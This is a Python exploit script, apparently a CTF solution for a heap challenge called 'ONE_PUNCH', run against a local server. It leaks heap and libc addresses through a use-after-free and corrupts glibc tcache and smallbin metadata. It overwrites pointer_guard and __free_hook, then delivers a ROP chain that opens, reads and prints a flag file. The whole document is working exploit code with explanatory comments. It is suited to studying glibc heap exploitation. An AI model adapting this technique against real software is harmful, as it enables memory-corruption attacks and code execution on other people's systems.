import socket
import sys
from time import sleep
from struct import pack, unpack

from utils import _is_int, to_bytes, from_bytes, rol
from roputils import *
from logger import Logger

logger = Logger("ONE_PUNCH")

SERVER_ADDR = ('localhost', 8889)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(SERVER_ADDR)

def get_libc_path():
    with open("libcpath", "r") as f:
        return f.read()[:-1]

# NOTE: binary uses atoi w/o zero-ing before

DELAY = 0.05

ALLOC = b'1\x00'
UPDATE = b'2\x00'
SHOW = b'3\x00'
FREE = b'4\x00'
EXIT = b'5\x00'
OPT_0xC388 = b'50056\x00'

def allocate_request(idx, content):

    assert(idx in [0, 1, 2])

    if type(content) is str:
        content = content.encode()

    assert(0x7f < len(content) <= 0x400)

    sleep(DELAY)

    sock.recv(1024)
    sock.send(f"{idx}".encode() + b'\x00')

    sleep(DELAY)
    sock.send(content)
    sleep(DELAY)

    return idx

def update_request(idx, content):

    assert(idx in [0, 1, 2])

    if type(content) is str:
        content = content.encode()

    assert(len(content) > 0)
    
    sleep(DELAY)

    sock.recv(1024)
    sock.send(f"{idx}".encode() + b'\x00')

    sleep(DELAY)
    
    sock.recv(1024)
    sock.send(content)

    return None

def free_request(idx):

    assert(idx in [0, 1, 2])
    
    sleep(DELAY)

    sock.recv(1024)
    sock.send(f"{idx}".encode() + b'\x00')

    return None

def show_request(idx):

    assert(idx in [0, 1, 2])
    
    sleep(DELAY)

    sock.recv(1024)
    sock.send(f"{idx}".encode() + b'\x00')

    sleep(DELAY)
    recvd = sock.recv(1024)

    # logger.log_info(f"raw recvd: {recvd}")

    recvd = recvd.split(b"hero name: ")[1].split(b'\n############################')[0]

    return recvd

def opt_0xc388_request(content):

    if type(content) is str:
        content = content.encode()

    assert(len(content) > 0)

    sleep(DELAY)

    sock.recv(1024)
    sock.send(content)

    sleep(DELAY)

    recvd = sock.recv(1024 * 1024)
    recvd = recvd.split(b"Serious Punch!!!\n")[1].split(b'\n############################')[0]

    return recvd

def command(opt):

    sock.send(opt[0])

    if opt[0] is ALLOC:
        logger.log_info(f"allocating chunk on idx {opt[1]}")
        return allocate_request(*opt[1:])

    elif opt[0] is UPDATE:
        logger.log_info(f"updating chunk with index {opt[1]}")
        return update_request(*opt[1:])

    elif opt[0] is FREE:
        logger.log_info(f"free chunk with index {opt[1]}")
        return free_request(*opt[1:])

    elif opt[0] is SHOW:
        logger.log_info(f"showing chunk with index {opt[1]}")
        return show_request(*opt[1:])

    elif opt[0] is EXIT:
        logger.log_info(f"sending exit command")
        return None

    elif opt[0] is OPT_0xC388:
        logger.log_info("calling option 0xc388")
        return opt_0xc388_request(*opt[1:])

def command_stream():

    # canary, PIE, ASLR, relro full

    # NOTE: after finishing and checking another writeup, 
    #       I figured out my solution (at least the pointer_guard overwrite part) was a bit overkill
    #       but it is interesting nonetheless

    sock.recv(1024)

    # for readability only 
    ch = {}

    MINSIZE = 0x7f + 0x1
    FB_MAX = 0xa0

    #input()

    # ===== leak heap base and libc base =====

    LEAKED_CH_OFFSET = 0x2a0

    ch['to_leak'] = command((ALLOC, 0, 'A' * MINSIZE))
    ch['leaker'] = command((ALLOC, 1, 'A' * MINSIZE))

    command((FREE, ch['to_leak']))
    command((FREE, ch['leaker']))

    leaked_ch_addr = from_bytes(command((SHOW, ch['leaker'])))
    heap_base_addr = leaked_ch_addr - LEAKED_CH_OFFSET

    logger.log_success(f"heap base address leaked: {hex(heap_base_addr)}")

    # we also know that the leaked chunk address 
    # is the address of the first malloc

    UBIN_OFFSET = 0x1ebbe0

    # fill tcache for a size > fb max (0xa0)
    # next free will go in unsorted bin

    for _ in range(7):
        ch['filler'] = command((ALLOC, 0, 'B' * FB_MAX))    # fb_max + header size > fb_max
        command((FREE, ch['filler']))

    ch['ubin_leaker'] = command((ALLOC, 0, 'C' * FB_MAX))
    ch['pad'] = command((ALLOC, 1, 'D' * MINSIZE))

    command((FREE, ch['ubin_leaker']))

    leaked_ubin_addr = from_bytes(command((SHOW, ch['ubin_leaker'])))
    libc_base_addr = leaked_ubin_addr - UBIN_OFFSET
    
    logger.log_success(f"libc base address leaked: {hex(libc_base_addr)}")

    # make sure this chunk is not used again
    ch['ubin_leaker'] = command((ALLOC, 0, 'C' * FB_MAX))

    # ===== smallbin to tcache attack =====
    # overwrite TCB.pointer_guard to bypass __longjmp check in future usage

    FS_OFFSET = 0x1f3540    # from libc base, unsure if affected by ASLR
    TARGET_ADDR = libc_base_addr + FS_OFFSET + 0x30

    rem_size = 0xd0
    s0 = 2 * rem_size + 0x10    # 0x1b0
    s1 = s0 - rem_size          # 0xe0
    pad_size = rem_size + 0x10  # 0xe0

    assert(s1 > s0 // 2)
    assert(s0 - s1 > MINSIZE)
    assert(pad_size > rem_size)

    # filling tcache for s0 size
    for _ in range(7):
        ch['filler'] = command((ALLOC, 0 , b'0' * (s0 - 0x10)))
        command((FREE, ch['filler']))

    #input()

    for _ in range(8):

        ch['pad0'] = command((ALLOC, 0, b'E' * (pad_size - 0x10)))
        ch['s0_ch'] = command((ALLOC, 0, b'F' * (s0 - 0x10)))
        ch['pad1'] = command((ALLOC, 1, b'E' * (pad_size - 0x10)))

        command((FREE, ch['s0_ch']))                            # put s0_ch in UB
        ch['s1_ch'] = command((ALLOC, 1, b'G' * (s1 - 0x10)))   # split s0_ch and move remainder back in UB

    ch['pad'] = command((ALLOC, 1, b'E' * (pad_size - 0x10)))  # trigger UB -> SB for 8th chunk

    #input()

    # overwrite the last chunk of rem_size: ch->bk = TARGET - 0x10
    command((UPDATE, ch['s0_ch'], b'I' * 0xd0 +                                  # reach rem chunk
                                    b'\x00' * 8 + to_bytes(rem_size | 0x01) +    # rem chunk header
                                    b'\x00' * 8 + to_bytes(TARGET_ADDR - 0x10)))     

    #input()

    ch['rem_ch'] = command((ALLOC, 0, b'J' * (rem_size - 0x10)))

    # we should now have TARGET -> FD == addr of corresponding smallbin
    # NOTE: smallbin for size 0xd0 remains corrupted
    
    # ===== obtaining access to malloc(0x217) =====

    TCACHE_CHECKED_SIZE = 0x120
    
    for _ in range(7):
        ch['filler'] = command((ALLOC, 0, b'K' * (TCACHE_CHECKED_SIZE - 0x10)))
        command((FREE, ch['filler']))

    # ===== overwriting __free_hook with __longjmp address =====

    FREE_HOOK_OFFSET = 0x1eeb28
    LONGJMP_OFFSET = 0x45eb0

    NEST_SIZE = 0x390
    NESTED_SIZE = 0xe0

    # fill tcache for nest size
    # for nested the tcache remains clear intentionally

    for _ in range(7):
        ch['filler'] = command((ALLOC, 0, b'1' * NEST_SIZE))
        command((FREE, ch['filler']))

    ch['nest'] = command((ALLOC, 0, b'L' * NEST_SIZE))  # 0x390 + 0x10 > 0x210 + 0x10
    command((FREE, ch['nest'])) # merge w top

    ch['pad'] = command((ALLOC, 1, b'0' * NESTED_SIZE))
    ch['nested0'] = command((ALLOC, 1, b'M' * NESTED_SIZE)) 
    ch['nested1'] = command((ALLOC, 2, b'N' * NESTED_SIZE))     

    command((UPDATE, ch['nest'], b'O' * NESTED_SIZE +                       # reach nested0 header
                                    b'\x00' * 8 + to_bytes(0x220 | 0x1) +   # nested0 header
                                    b'P' * NESTED_SIZE +                    # reach nested1 header
                                    b'\x00' * 8 + to_bytes(0x220 | 0x1)))   # nested1 header

    #input()

    # order of free chosen arbitrary
    command((FREE, ch['nested1']))
    command((FREE, ch['nested0']))
    command((UPDATE, ch['nested0'], to_bytes(libc_base_addr + FREE_HOOK_OFFSET - 0x8)))

    #input()

    command((OPT_0xC388, b'Q' * 0x10))  # content does not matter here
    
    # for some reason, it does not take 
    # my input for the second malloc request
    # so I just "fixed" by an intermediary request
    # that does not influence anything
    ch['_'] = command((ALLOC, 0, b'A' * 0x300))
    
    command((OPT_0xC388, b'\x00' * 8 + to_bytes(libc_base_addr + LONGJMP_OFFSET)))
    
    # __free_hook should now be overwritten with __longjmp address
    
    # ===== stack pivoting and rop =====

    # ----> first method
    # copied from another writeup

    # open flag file
    # read from flag file in intermediary buffer
    # write to stdout from interm buffer

     # we need a payload of the form
    #
    # rax = 2
    # rdi = &"flag"
    # rsi = 0
    #   syscall
    # rax = 0
    # rdi = rax
    # rsi = &aux_buffer
    # rdx = flag_len
    #   syscall
    # rax = 1
    # rdi = 1
    # rsi = &aux_buffer
    # rdx = flag_len
    #   syscall

    SYSCALL_OFFSET = 0x122ac9
    PAYLOAD_OFFSET = 0x5920 

    syscall_addr = SYSCALL_OFFSET + libc_base_addr

    payload_addr = PAYLOAD_OFFSET + heap_base_addr

    flag_len = 13
    flag_string_addr = payload_addr + 0x40
    aux_buffer_addr = payload_addr + 0x50
    fake_rsp = payload_addr + 0x60

    pointer_guard = 0x1ebca0 + libc_base_addr

    # searching for rop chains and building the payload

    r = ROP_util(get_libc_path(), Platform.X86_64, session_name = "ONE_PUNCH")
    r.scout_for_gadgets()

    payload = r.make_payload()
    payload.set_max_size(0x900)

    payload.add_bytes(b'A' * 8 * 6 + 
                        to_bytes(rol(fake_rsp ^ pointer_guard, 0x11)) + 
                        b'B' * 8 +                  # first gadget address TO BE REPLACED AFTER A FEW MORE STEPS 
                        b"flag" + b'\x00' * 0xc +   # flag string
                        b'\x00' * 0x10)             # aux buffer - empty

    payload.is_aligned_as(0x8)  # at the end, we take the first 8 bytes from the payload == first gadget address

    for chain in r.search_chain(f"rax = 2, rdi = {flag_string_addr}, rsi = 0", max_stack_byte_size = 0x200):

        chain.show()

        payload.add_chain(chain)
        payload.align_as(0x10)
        payload.add_addr(syscall_addr)

        break

    # NOTE: file opened by syscall has fd returned in rax
    #       ideally, we would have used a chain that moves rax to rdi
    #       but this type of chain was not found
    #       so we need to guess the fd value (in my case, it was 5)

    for chain in r.search_chain(f"rax = 0, rdi = 5, rsi = {aux_buffer_addr}, rdx = {flag_len}", max_stack_byte_size = 0x200):

        chain.show()

        payload.add_chain(chain)
        payload.align_as(0x10)
        payload.add_addr(syscall_addr)

        break

    for chain in r.search_chain(f"rax = 1, rdi = 1, rsi = {aux_buffer_addr}, rdx = {flag_len}", max_stack_byte_size = 0x200):

        chain.show()

        payload.add_chain(chain)
        payload.align_as(0x10)
        payload.add_addr(syscall_addr)

        break

    payload.add_addr(0xDEADBEEFDEADBEEF)

    payload = payload.build(chain_addr_offset = libc_base_addr)

    # relocating first chain addr from payload[0x60:]
    chain_addr = rol(from_bytes(payload[0x60: 0x68]) ^ pointer_guard, 0x11)
    payload = payload[:0x38] + to_bytes(chain_addr) + payload[0x40: 0x60] + \
                payload[0x68:]
    
    # allocating chunk with payload
    # (stack will be pivoted inside it)

    ch["rop_payload"] = command((ALLOC, 0, b'Z' * (len(payload) + 1)))
    command((UPDATE, ch["rop_payload"], payload))

    #input()

    logger.log_info(f"Payload delivered at {hex(payload_addr)}")

    # trigger payload

    #input()

    command((FREE, ch["rop_payload"]))
    
    sleep(DELAY)
    logger.log_success(f"flag contents: {sock.recv(1024).decode()}")

    input()

if __name__ == "__main__":
    command_stream()
